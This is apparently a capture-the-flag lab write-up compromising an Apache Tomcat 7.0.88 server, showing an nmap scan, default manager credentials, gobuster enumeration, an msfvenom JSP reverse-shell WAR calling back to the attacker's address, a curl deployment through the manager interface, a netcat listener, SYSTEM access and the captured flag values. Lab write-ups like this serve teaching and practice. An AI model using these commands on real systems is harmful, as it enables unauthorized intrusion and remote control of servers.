
Target : 10.129.37.55

Started off with the port scan : 8080

```
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized
Running (JUST GUESSING): Microsoft Windows 2012|7|2008 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Embedded Standard 7 (85%), Microsoft Windows 7 or Windows Server 2008 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
```

Enumerating Port : 8080

When visit the service, it is found out to be Apache/Tomcat 7.0.88, which is vulnerable to RCE

![](../Pasted%20image%2020260721101544.png)

used this credential pair to access the `\manager` & `\host-manager` successfully.

`tomcat : s3cret`

Directory enumeration using gobuster:

`gobuster dir -u "http://10.129.37.55:8080/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt`

```
docs                 (Status: 302) [Size: 0] [--> /docs/]
examples             (Status: 302) [Size: 0] [--> /examples/]
favicon.ico          (Status: 200) [Size: 21630]
host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
lpt1                 (Status: 200) [Size: 0]
lpt2                 (Status: 200) [Size: 0]
manager              (Status: 302) [Size: 0] [--> /manager/]
```

![](../Pasted%20image%2020260721112437.png)

Now, we now tomcat is running, it renders java, generated a reverse shell payload with msfvenom

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.241 LPORT=1234 -f war -o shell.war`

Once, the payload generated, now we can upload the payload using text interface

`curl -u ${USR}:${PASS} http://10.129.37.55:8080/manager/text/deploy?path=/examples/shell --upload-file shell.war`

USR=tomcat, PASS=s3cret

![](../Pasted%20image%2020260721152529.png)

Got the initial foothold, once i trigger the `shell`

`curl -u tomcat:s3cret http://10.129.37.55:8080/examples/shell`

`nc -lvnp 1234`

Once the shell pops out, it turns out to be an administrator.

```
C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```

```
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"

user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```


To be noted:

1. Solved without overseeing any walkthroughs.